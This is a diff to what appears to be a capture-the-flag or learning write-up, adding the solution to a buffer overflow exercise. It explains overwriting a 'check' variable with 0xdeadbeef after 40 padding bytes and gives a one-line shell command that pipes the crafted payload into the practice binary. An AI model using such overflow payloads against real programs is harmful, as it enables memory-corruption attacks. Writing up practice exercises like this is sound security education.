@@ -25,3 +25,8 @@ void main(int argc, char *argv[])
 }
 ```
 >Goal: print out the text "Yeah! You win!"
+### Solution:
+- To overflow the memory, we need to input *40 random bytes* + *4 bytes to change **check's** data*
+- In order to print out the text "Yeah! You win!", we must change ***check's*** data into *0xdeadbeef*
+- Type `echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.o`
+- Goal achieved!
